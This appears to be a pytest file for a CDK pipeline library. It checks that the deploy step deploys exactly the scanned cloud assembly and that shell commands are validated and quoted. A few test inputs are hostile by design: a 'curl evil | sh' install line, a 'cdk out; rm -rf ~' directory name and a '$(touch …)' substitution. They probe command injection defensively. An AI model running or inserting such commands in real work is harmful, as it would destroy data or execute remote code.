"""Build once: the assembly the gates inspect is the assembly that is deployed."""

import copy
import json
import shutil
import subprocess

import pytest
from aws_cdk import aws_iam as iam
from aws_cdk.assertions import Template
from test_pipeline import GATES, build

from specter_pipeline import Assembly, DeployStep, Gate, PostDeployStep, Runtime
from specter_pipeline import testing as c
from specter_pipeline.gate import CdkCall, assembly_deploy_violations, cdk_calls
from specter_pipeline.presets import (
    assembly_scan_guard,
    python_cdk_assembly,
    python_cdk_gates,
)

REPO = "Specter099/demo"
SCAN = Gate("scan", ["ls cdk.out"], uses_assembly=True)
ASM_GATES = [*GATES, SCAN]
DEPLOY = DeployStep("app", ["cdk deploy --app cdk.out AppStack --require-approval never"])


def asm_build(**overrides) -> Template:
    kw = {
        "application_stage": None,
        "assembly": Assembly(install=["pip install -r requirements.txt"]),
        "deploy_step": DEPLOY,
        "gates": ASM_GATES,
    }
    kw.update(overrides)
    return build(**kw)


@pytest.fixture(scope="module")
def tpl() -> Template:
    return asm_build()


def actions(t: Template, stage: str) -> dict:
    return {a["Name"]: a for a in c._stage(t, stage)["Actions"]}


def inputs(action: dict) -> set[str]:
    return {i["Name"] for i in action.get("InputArtifacts", [])}


# --- does the deploy step deploy the assembly? ------------------------------------------------


@pytest.mark.parametrize(
    "commands",
    [
        ["cdk deploy --app cdk.out AppStack --require-approval never"],
        ["cdk deploy --app ./cdk.out/ AppStack"],
        ["cdk -a cdk.out deploy AppStack"],
        ["CDK_X=1 npx -y cdk deploy --app=cdk.out AppStack"],
        ["echo cdk deploy is next", "cdk deploy -a cdk.out AppStack"],
        ["cdk deploy -a cdk.out AppStack && cd /tmp"],  # cd after the deploy is harmless
        # the pipeline's own prelude must not count as a CDK invocation
        ["npm install -g --prefix /tmp/nodejs aws-cdk@2.1149.0", "cdk --version",
         "cdk deploy -a cdk.out AppStack"],
    ],
)
def test_deploying_the_assembly_is_accepted(commands):
    assert assembly_deploy_violations(commands, "cdk.out") == []


@pytest.mark.parametrize(
    "commands,reason",
    [
        # a second deploy, however the commands are joined
        (["cdk deploy --app cdk.out A; cdk deploy B"], "exactly `--app cdk.out`"),
        (["cdk deploy --app cdk.out A&&cdk deploy B"], "exactly `--app cdk.out`"),
        (["cdk deploy --app cdk.out A\ncdk deploy B"], "exactly `--app cdk.out`"),
        (["cdk deploy --app cdk.out A & cdk deploy B"], "exactly `--app cdk.out`"),
        (["cdk deploy --app cdk.out A || cdk deploy B"], "exactly `--app cdk.out`"),
        (["cdk deploy --app cdk.out A | tee log; cdk deploy B"], "exactly `--app cdk.out`"),
        # more than one --app: which one wins is the CLI's business, not ours
        (["cdk deploy B --app 'python3 app.py' --app cdk.out"], "exactly `--app cdk.out`"),
        (["cdk deploy --app 'python3 app.py' B"], "exactly `--app cdk.out`"),
        # other spellings of the CLI
        (["npx aws-cdk deploy B"], "exactly `--app cdk.out`"),
        (["npx cdk@2 deploy B"], "exactly `--app cdk.out`"),
        (["/tmp/nodejs/bin/cdk deploy B"], "exactly `--app cdk.out`"),
        (["bash -c 'cdk deploy B'"], "exactly `--app cdk.out`"),
        (["eval cdk deploy B"], "exactly `--app cdk.out`"),
        (["(cdk deploy B)"], "exactly `--app cdk.out`"),
        # re-synthesizing rewrites the linked artifact
        (["cdk synth && cdk deploy --app cdk.out B"], "runs `cdk synth`"),
        (["rm -rf cdk.out && cdk synth && cdk deploy --app cdk.out B"], "runs `cdk synth`"),
        (["npx cdk synthesize", "cdk deploy -a cdk.out B"], "runs `cdk synth`"),
        # a relative --app after a cd is some other directory
        (["cd infra && cdk deploy --app cdk.out B"], "changed directory"),
        (["cd infra", "cdk deploy --app cdk.out B"], "changed directory"),
        # nothing to check, or nothing parseable: fail closed
        (["./scripts/deploy.sh"], "no `cdk deploy --app cdk.out` found"),
        (["make deploy"], "no `cdk deploy --app cdk.out` found"),
        (['echo "unbalanced', "cdk deploy -a cdk.out A"], "cannot parse"),
    ],
)
def test_anything_else_is_refused(commands, reason):
    problems = assembly_deploy_violations(commands, "cdk.out")
    assert problems and any(reason in p for p in problems), problems


def test_cdk_calls_reads_subcommand_and_apps():
    assert cdk_calls("cdk -c k=v --app cdk.out deploy A") == [CdkCall("deploy", ("cdk.out",))]
    assert cdk_calls("cdk --version") == [CdkCall(None, ())]
    assert cdk_calls("npm install -g aws-cdk@2") == []


# --- step validation ---------------------------------------------------------------------------


def test_assembly_defaults():
    a = Assembly()
    assert (a.name, a.commands, a.runtime, a.output_dir, a.memory_gb) == (
        "Assemble",
        ["cdk synth"],
        Runtime.PYTHON_NODE,
        "cdk.out",
        4,
    )


def test_assembly_refuses_iam_permissions():
    stmt = iam.PolicyStatement(actions=["ssm:GetParameter"], resources=["arn:aws:ssm:::x"])
    with pytest.raises(ValueError, match="no IAM permissions"):
        Assembly(policy_statements=[stmt])


def test_assembly_needs_python_and_node():
    with pytest.raises(ValueError, match="PYTHON_NODE"):
        Assembly(runtime=Runtime.PYTHON)


@pytest.mark.parametrize("bad", ["/abs", "../up", "a/../b", "", "with space", ".", "./", "a/.."])
def test_assembly_output_dir_must_be_relative(bad):
    with pytest.raises(ValueError, match="relative path"):
        Assembly(output_dir=bad)


@pytest.mark.parametrize("name", ["Gate-scan", "Deploy-app", "Post-x", "Approve-Deploy"])
def test_assembly_name_cannot_collide_with_pipeline_steps(name):
    with pytest.raises(ValueError, match="collides"):
        Assembly(name=name)


@pytest.mark.parametrize("cls", [Gate, DeployStep, PostDeployStep, Assembly])
def test_every_step_copies_its_lists(cls):
    commands, install = ["one"], ["pip install x"]
    step = cls(name="s", commands=commands, install=install)
    commands.append("two")
    install.append("curl evil | sh")
    assert step.commands == ["one"] and step.install == ["pip install x"]


@pytest.mark.parametrize("cls", [Gate, DeployStep, PostDeployStep])
def test_a_bare_string_is_not_a_command_list(cls):
    with pytest.raises(TypeError, match="lists of strings"):
        cls("s", "cdk deploy")


# --- pipeline validation -----------------------------------------------------------------------


def test_assembly_is_refused_with_an_application_stage():
    with pytest.raises(ValueError, match="already builds the assembly"):
        build(assembly=Assembly())


def test_a_gate_cannot_read_an_assembly_the_pipeline_does_not_build():
    with pytest.raises(ValueError, match="no assembly"):
        asm_build(assembly=None)


@pytest.mark.parametrize(
    "command",
    [
        "cdk deploy AppStack --require-approval never",
        "cdk synth && cdk deploy --app cdk.out AppStack",
        "cdk deploy --app cdk.out A&&cdk deploy B",
    ],
)
def test_the_pipeline_refuses_a_deploy_step_that_does_not_deploy_the_assembly(command):
    with pytest.raises(ValueError, match="must deploy exactly the assembly"):
        asm_build(deploy_step=DeployStep("app", [command]))


def test_install_commands_are_checked_too():
    with pytest.raises(ValueError, match="runs `cdk synth`"):
        asm_build(deploy_step=DeployStep("app", DEPLOY.commands, install=["cdk synth"]))


def test_a_deploy_script_is_refused_because_it_cannot_be_checked():
    # The README promises the deploy is checked; a script would hide a re-synth.
    with pytest.raises(ValueError, match="a script cannot be checked"):
        asm_build(deploy_step=DeployStep("app", ["./scripts/deploy.sh"]))


def test_script_work_can_sit_next_to_a_direct_deploy():
    t = asm_build(
        deploy_step=DeployStep(
            "app", ["./scripts/pre-deploy.sh", *DEPLOY.commands, "./scripts/smoke.sh"]
        )
    )
    c.assert_standard_contract(t, repo=REPO, gates=ASM_GATES, node_gates=["synth-check", "lint"])


def test_a_custom_output_dir_is_honoured_end_to_end():
    t = asm_build(
        assembly=Assembly(output_dir="build/cdk.out"),
        deploy_step=DeployStep("app", ["cdk deploy -a build/cdk.out AppStack"]),
    )
    assert "build/cdk.out" in c.step_mounts(t, "Deploy-app").values()
    c.assert_builds_once(t, ASM_GATES)


# --- what it synthesizes -----------------------------------------------------------------------


def test_stage_order_is_unchanged(tpl):
    c.assert_stage_order(tpl)


def test_only_assembly_gates_wait_for_the_assembly(tpl):
    gates = actions(tpl, "Gates")
    first = gates["Assemble"]["RunOrder"]
    for g in GATES:
        assert gates[f"Gate-{g.name}"]["RunOrder"] == first, g.name
    assert gates["Gate-scan"]["RunOrder"] > first


def test_scan_gate_and_deploy_read_the_same_artifact(tpl):
    (out,) = actions(tpl, "Gates")["Assemble"]["OutputArtifacts"]
    assert out["Name"] in inputs(actions(tpl, "Gates")["Gate-scan"])
    assert out["Name"] in inputs(actions(tpl, "Deploy")["Deploy-app"])
    for g in GATES:
        assert out["Name"] not in inputs(actions(tpl, "Gates")[f"Gate-{g.name}"])
    assert c.step_mounts(tpl, "Deploy-app") == {out["Name"]: "cdk.out"}
    assert c.step_mounts(tpl, "Gate-scan") == {out["Name"]: "cdk.out"}


def test_assembly_step_installs_the_pinned_cli_then_synthesizes(tpl):
    cmds = c.step_commands(tpl, "Assemble")
    cli = next(i for i, x in enumerate(cmds) if x.startswith("npm install -g") and "aws-cdk@" in x)
    assert cmds.index("pip install -r requirements.txt") > cli
    assert cmds[-1] == "cdk synth"


def test_every_project_is_still_lambda_compute(tpl):
    c.assert_lambda_compute(tpl)
    c.assert_ci_env_on_repo_command_projects(tpl)


def test_approval_still_strictly_precedes_the_deploy(tpl):
    c.assert_deploy_ordering(tpl)
    c.assert_deploy_closed(tpl)


def test_contract_passes_and_includes_build_once(tpl):
    c.assert_standard_contract(tpl, repo=REPO, gates=ASM_GATES, node_gates=["synth-check", "lint"])


def test_contract_checks_build_once_whenever_there_is_an_assembly_step():
    """No gate reads the assembly, but the deploy still must: the contract notices the step."""
    doc = copy.deepcopy(asm_build(gates=GATES).to_json())
    _deploy_without_app(doc["Resources"])
    with pytest.raises(AssertionError, match="does not deploy the assembly"):
        c.assert_standard_contract(
            Template.from_json(doc), repo=REPO, gates=GATES, node_gates=["synth-check", "lint"]
        )


def test_stage_mode_gates_read_the_synth_output_that_is_deployed():
    t = build(gates=ASM_GATES)
    gates = actions(t, "Gates")
    assert "Assemble" not in gates
    assert "Synth_Output" in inputs(gates["Gate-scan"])
    c.assert_standard_contract(
        t, repo=REPO, gates=ASM_GATES, deploy_stage="Prod", node_gates=["synth-check", "lint"]
    )


# --- pull requests -----------------------------------------------------------------------------


def _pr(t: Template, gate: str) -> dict:
    (res,) = [
        r for r in c.pr_projects(t, "demo").values() if r["Properties"]["Name"] == f"demo-pr-{gate}"
    ]
    return res["Properties"]


def test_pr_check_for_an_assembly_gate_builds_the_assembly_first(tpl):
    props = _pr(tpl, "scan")
    cmds = json.loads(props["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert any("node.tgz" in x for x in cmds), "needs Node to synthesize"
    assert cmds.index("cdk synth") < cmds.index("ls cdk.out")
    assert "python3.12" in props["Environment"]["Image"]


def test_pr_check_for_an_assembly_gate_gets_the_assembly_memory(tpl):
    assert _pr(tpl, "scan")["Environment"]["ComputeType"] == "BUILD_LAMBDA_4GB"
    t = asm_build(assembly=Assembly(memory_gb=10))
    assert _pr(t, "scan")["Environment"]["ComputeType"] == "BUILD_LAMBDA_10GB"
    assert _pr(t, "lint")["Environment"]["ComputeType"] == "BUILD_LAMBDA_2GB"


def test_stage_mode_pr_check_gets_the_synth_memory():
    t = build(gates=ASM_GATES, synth_memory_gb=8)
    assert _pr(t, "scan")["Environment"]["ComputeType"] == "BUILD_LAMBDA_8GB"


def test_pr_check_for_an_ordinary_gate_is_unchanged(tpl):
    cmds = json.loads(_pr(tpl, "lint")["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert cmds == ["npm run lint"]


def test_pr_roles_stay_least_privilege(tpl):
    c.assert_pr_checks(tpl, ASM_GATES, "demo")
    c.assert_pr_roles_least_privilege(tpl, "demo")


def test_stage_mode_pr_check_reuses_the_synth_recipe():
    t = build(gates=ASM_GATES)
    cmds = json.loads(_pr(t, "scan")["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert cmds.index("cdk -a 'python3 pipeline_app.py' synth") < cmds.index("ls cdk.out")


# --- presets -----------------------------------------------------------------------------------


def test_preset_assembly_mode_reads_the_shared_templates():
    gates = {g.name: g for g in python_cdk_gates(assembly=True)}
    synth = gates["cdk-synth"]
    assert synth.uses_assembly and synth.commands == ["test -f cdk.out/manifest.json"]
    assert synth.runs_on_pull_requests and not synth.policy_statements
    aa = gates["access-analyzer"]
    assert aa.uses_assembly and aa.runtime is Runtime.PYTHON
    assert not any("cdk synth" in x for x in aa.commands)
    assert not any("requirements.txt" in x or "aws-cdk@" in x for x in aa.install)
    assert any("--template-dir cdk.out " in x for x in aa.commands)
    assert any("sha256sum -c" in x for x in aa.commands), "script must still be verified"
    assert not aa.runs_on_pull_requests


def test_preset_assembly_mode_still_synthesizes_every_pull_request():
    t = asm_build(assembly=python_cdk_assembly(), gates=python_cdk_gates(assembly=True))
    cmds = json.loads(_pr(t, "cdk-synth")["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert cmds.index("cdk synth") < cmds.index("test -f cdk.out/manifest.json")


def test_preset_default_is_unchanged():
    gates = {g.name: g for g in python_cdk_gates()}
    assert "cdk-synth" in gates and not gates["access-analyzer"].uses_assembly
    assert gates["access-analyzer"].commands[0] == "cdk synth --quiet"


def test_preset_assembly_dir_reaches_every_command():
    gates = {g.name: g for g in python_cdk_gates(assembly=True, assembly_dir="cdk.out/assembly-Prod")}
    assert any("--template-dir cdk.out/assembly-Prod " in x for x in gates["access-analyzer"].commands)
    assert gates["cdk-synth"].commands == ["test -f cdk.out/assembly-Prod/manifest.json"]


def test_preset_template_dir_is_quoted():
    (aa,) = [g for g in python_cdk_gates(assembly=True, assembly_dir="cdk out; rm -rf ~")
             if g.name == "access-analyzer"]
    assert any("--template-dir 'cdk out; rm -rf ~' " in x for x in aa.commands)
    assert "ls -d 'cdk out; rm -rf ~'/assembly-*" in aa.commands[0]
    assert "ls 'cdk out; rm -rf ~'/*.template.json" in aa.commands[1]


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
def test_the_scan_guard_never_expands_the_directory_name(tmp_path):
    marker = tmp_path / "pwned"
    script = "\n".join(assembly_scan_guard(f"$(touch {marker})"))
    subprocess.run(["bash", "-c", script], check=False, cwd=tmp_path, capture_output=True, text=True)
    assert not marker.exists()


def _guard(tmp_path, layout):
    for rel in layout:
        f = tmp_path / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text("{}")
    script = "set -e\n" + "\n".join(assembly_scan_guard("cdk.out"))
    return subprocess.run(["bash", "-c", script], check=False, cwd=tmp_path, capture_output=True, text=True)


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize(
    "layout,ok,says",
    [
        (["cdk.out/manifest.json", "cdk.out/AppStack.template.json"], True, ""),
        (["cdk.out/manifest.json"], False, "no templates"),
        # an application_stage pipeline's top level: the pipeline stack plus nested stages
        (["cdk.out/PipelineStack.template.json", "cdk.out/assembly-Prod/AppStack.template.json"],
         False, "nested stage assemblies"),
    ],
)
def test_the_scan_guard_refuses_to_scan_nothing(tmp_path, layout, ok, says):
    result = _guard(tmp_path, layout)
    assert (result.returncode == 0) is ok, result.stdout + result.stderr
    assert says in result.stdout


def test_preset_pipeline_in_assembly_mode_satisfies_the_contract():
    gates = python_cdk_gates(assembly=True, env={"X": "1"})
    t = asm_build(assembly=python_cdk_assembly(env={"X": "1"}), gates=gates)
    c.assert_standard_contract(t, repo=REPO, gates=gates, node_gates=["tests"])
    allowed = c.CDK_INTERNAL_WILDCARDS | {"access-analyzer:CheckNoPublicAccess"}
    c.assert_no_wildcard_resources(t, allowed_actions=allowed)


# --- the helper rejects each way of not building once ------------------------------------------


def mutated(change) -> Template:
    doc = copy.deepcopy(asm_build().to_json())
    change(doc["Resources"])
    return Template.from_json(doc)


def _stage_of(res, name):
    pipe = next(r for r in res.values() if r["Type"] == "AWS::CodePipeline::Pipeline")
    return next(s for s in pipe["Properties"]["Stages"] if s["Name"] == name)


def _action(res, stage, name):
    return next(a for a in _stage_of(res, stage)["Actions"] if a["Name"] == name)


def _project(res, step):
    return next(
        r["Properties"]
        for r in res.values()
        if r["Type"] == "AWS::CodeBuild::Project"
        and str(r["Properties"].get("Description", "")).endswith(f"/{step}")
    )


def _drop_assembly_input(action):
    action["InputArtifacts"] = action["InputArtifacts"][:1]


def _deploy_without_app(res):
    props = _project(res, "Deploy-app")
    spec = json.loads(props["Source"]["BuildSpec"])
    spec["phases"]["build"]["commands"][-1] = "cdk deploy AppStack --require-approval never"
    props["Source"]["BuildSpec"] = json.dumps(spec)


def _deploy_without_mount(res):
    props = _project(res, "Deploy-app")
    spec = json.loads(props["Source"]["BuildSpec"])
    del spec["phases"]["install"]
    props["Source"]["BuildSpec"] = json.dumps(spec)


def _remove_assembly_step(res):
    st = _stage_of(res, "Gates")
    st["Actions"] = [a for a in st["Actions"] if a["Name"] != "Assemble"]


def _scan_in_parallel_with_assembly(res):
    _action(res, "Gates", "Gate-scan")["RunOrder"] = _action(res, "Gates", "Assemble")["RunOrder"]


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: _drop_assembly_input(_action(r, "Deploy", "Deploy-app")), "does not read the assembly"),
        (_deploy_without_app, "does not deploy the assembly"),
        (_deploy_without_mount, "does not link"),
        (lambda r: _drop_assembly_input(_action(r, "Gates", "Gate-scan")), "does not read the deployed"),
        (_scan_in_parallel_with_assembly, "does not wait for the assembly"),
        (_remove_assembly_step, "no assembly step"),
    ],
)
def test_assert_builds_once_rejects(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_builds_once(mutated(change), ASM_GATES)


def _stage_mutated(change) -> Template:
    doc = copy.deepcopy(build(gates=ASM_GATES).to_json())
    change(doc["Resources"])
    return Template.from_json(doc)


def _add_producer(res):
    extra = copy.deepcopy(_action(res, "Gates", "Gate-scan"))
    extra["Name"] = "Assemble"
    extra["OutputArtifacts"] = [{"Name": "Second_Output"}]
    _stage_of(res, "Gates")["Actions"].append(extra)


def _prepare_reads_other_artifact(res):
    for a in _stage_of(res, "Prod")["Actions"]:
        if a["ActionTypeId"]["Provider"] == "CloudFormation" and a.get("InputArtifacts"):
            a["InputArtifacts"] = [{"Name": "Other_Output"}]


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: _drop_assembly_input(_action(r, "Gates", "Gate-scan")), "does not read the deployed"),
        (_add_producer, "must not build a second assembly"),
        (_prepare_reads_other_artifact, "does not read the deployed"),
    ],
)
def test_assert_builds_once_rejects_in_stage_mode(change, message):
    c.assert_builds_once(build(gates=ASM_GATES), ASM_GATES, "Prod")  # unmutated passes
    with pytest.raises(AssertionError, match=message):
        c.assert_builds_once(_stage_mutated(change), ASM_GATES, "Prod")


def test_assert_gates_present_rejects_an_unexpected_second_producer():
    def add(res):
        st = _stage_of(res, "Gates")
        extra = copy.deepcopy(_action(res, "Gates", "Assemble"))
        extra["Name"] = "Assemble2"
        st["Actions"].append(extra)

    with pytest.raises(AssertionError, match="more than one"):
        c.assert_gates_present(mutated(add), ASM_GATES)


def test_assert_gates_present_still_requires_parallel_gates():
    def stagger(res):
        _action(res, "Gates", "Gate-lint")["RunOrder"] = 5

    with pytest.raises(AssertionError, match="parallel"):
        c.assert_gates_present(mutated(stagger), ASM_GATES)
